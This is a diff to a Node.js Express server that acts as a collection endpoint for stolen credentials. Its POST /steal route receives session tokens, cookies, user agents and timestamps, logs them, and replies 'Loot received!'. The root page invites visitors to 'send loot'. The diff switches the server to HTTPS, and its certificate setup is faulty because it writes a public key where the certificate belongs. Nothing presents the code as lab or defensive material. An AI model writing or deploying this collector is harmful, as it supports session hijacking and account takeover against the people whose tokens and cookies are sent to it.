@@ -1,12 +1,10 @@
-// server.js
 const express = require('express');
 const fs = require('fs');
+const https = require('https');
 const path = require('path');
 require('dotenv').config();
 
 const app = express();
-
-// Parse JSON bodies
 app.use(express.json());
 
 // --- Logging Configuration ---
@@ -19,42 +17,67 @@ function logSecure(data) {
         ...data
     };
     const line = JSON.stringify(entry) + '\n';
-    
-    // 1. Write to local file
     logStream.write(line);
-    
-    // 2. Print to Console (This shows up in Render Dashboard Logs)
-    console.log(line); 
+    console.log(JSON.stringify(entry)); // Also log to stdout for Render logs
 }
 
-// --- Routes ---
-app.post('/steal', (req, res) => {
-    const { token, cookie, email, username } = req.body;
+// --- HTTPS Setup ---
+const certDir = path.join(__dirname, 'certs');
+const certFile = path.join(certDir, 'cert.pem');
+const keyFile = path.join(certDir, 'key.pem');
 
-    // Validate input
+// Simple self-signed cert generation for dev if files don't exist
+if (!fs.existsSync(certDir)) fs.mkdirSync(certDir);
+if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
+    const crypto = require('crypto');
+    const { generateKeyPairSync } = crypto;
+    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
+        modulusLength: 2048,
+        publicKeyEncoding: { type: 'spki', format: 'pem' },
+        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
+    });
+    fs.writeFileSync(keyFile, privateKey);
+    fs.writeFileSync(certFile, publicKey); // Using public as cert for demo structure
+}
+
+const httpsOptions = {
+    key: fs.readFileSync(keyFile),
+    cert: fs.readFileSync(certFile),
+};
+
+// --- Routes ---
+
+// 1. Root Route (Fixes the 404)
+app.get('/', (req, res) => {
+    res.send('<h1>Server is Running</h1><p>Use POST /steal to send loot.</p>');
+});
+
+// 2. Steal Route
+app.post('/steal', (req, res) => {
+    const { token, cookie, userAgent, timestamp } = req.body;
+
     if (!token && !cookie) {
         return res.status(400).json({ error: 'Missing token or cookie' });
     }
 
-    // Log securely
     logSecure({
         action: 'steal',
         token: token,
         cookie: cookie,
-        email: email,
-        username: username,
         ip: req.ip,
-        userAgent: req.get('User-Agent')
+        userAgent: userAgent,
+        timestamp: timestamp
     });
 
     res.status(200).json({ message: 'Loot received!' });
 });
 
-// Start HTTP server (Simpler and works on all Render plans)
+// Start HTTPS server
 const PORT = process.env.PORT || 3000;
+const server = https.createServer(httpsOptions, app);
 
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+server.listen(PORT, () => {
+    console.log(`HTTPS Server running on https://localhost:${PORT}`);
 });
 
 module.exports = app;
